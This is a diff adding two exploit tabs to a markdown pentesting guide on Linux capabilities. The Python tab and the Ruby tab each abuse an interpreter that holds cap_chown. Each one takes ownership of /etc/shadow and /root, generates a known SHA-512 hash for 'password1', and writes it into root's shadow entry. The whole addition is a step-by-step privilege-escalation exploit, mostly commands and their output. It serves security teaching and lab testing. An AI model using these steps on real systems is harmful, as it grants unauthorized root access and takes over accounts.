@@ -696,8 +696,91 @@ su - root
 **This means that it's possible to change the ownership of any file.**
 {% endtab %}
 
-{% tab title="Exploit" %}
+{% tab title="Exploit - Python" %}
+In the following example the **`python`** binary has this capability.&#x20;
 
+```bash
+$ getcap -r / 2>/dev/null
+/usr/bin/python3.11 = cap_chown+ep
+```
+
+We can abuse it to modify the file owner of the `/etc/shadow` file or the `/root`. First we can check what is our current user id
+```bash
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Replace the attribute numbers with the current user id.
+```bash
+#Get /etc/shadow
+$ python -c 'import os;os.chown("/etc/shadow",33,33)'
+
+#Get /root directory
+$ python -c 'import os;os.chown("/root",33,33)'
+```
+
+We can now generate a new hash
+```bash
+#Using mkpasswd
+$ mkpasswd  -m sha-512 -S saltsalt -s
+Mot de passe : password1
+$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF6MiLywY/KggaYjrNNrzAnj/
+
+#Or with openssl
+$ openssl passwd -6 password1
+$6$5h9QsTjUEHVIFVwK$3MkSX5prCEkZax7z5ixV1hdmAghcAGTjX2gAyMFjcAYxYQ00H7xQvskRRi/y.0ouz0sRpqGUWzORK0MdAGv7b0
+```
+
+And edit the `/etc/shadow` file to change the root password
+```bash
+#Replace the hash
+$ vim /etc/shadow
+$ head -n1 /etc/shadow
+root:$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF6MiLywY/KggaYjrNNrzAnj/:17673:0:99999:7:::
+```
+{% endtab %}
+{% tab title="Exploit - Ruby" %}
+In the following example the **`ruby`** binary has this capability.&#x20;
+
+```bash
+$ getcap -r / 2>/dev/null
+/usr/bin/ruby = cap_chown+ep
+```
+
+We can abuse it to modify the file owner of the `/etc/shadow` file or the `/root` directory. First we can check what is our current user id
+```bash
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Replace the attribute numbers with the current user id.
+```bash
+#Get /etc/shadow
+$ ruby -e 'require "fileutils"; FileUtils.chown(33, 33, "/etc/shadow")'
+
+#Get /root directory
+$ ruby -e 'require "fileutils"; FileUtils.chown(33, 33, "/root")'
+```
+
+We can now generate a new hash
+```bash
+#Using mkpasswd
+$ mkpasswd  -m sha-512 -S saltsalt -s
+Mot de passe : password1
+$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF6MiLywY/KggaYjrNNrzAnj/
+
+#Or with openssl
+$ openssl passwd -6 password1
+$6$5h9QsTjUEHVIFVwK$3MkSX5prCEkZax7z5ixV1hdmAghcAGTjX2gAyMFjcAYxYQ00H7xQvskRRi/y.0ouz0sRpqGUWzORK0MdAGv7b0
+```
+
+And edit the `/etc/shadow` file to change the root password
+```bash
+#Replace the hash
+$ vim /etc/shadow
+$ head -n1 /etc/shadow
+root:$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF6MiLywY/KggaYjrNNrzAnj/:17673:0:99999:7:::
+```
 {% endtab %}
 {% endtabs %}
 
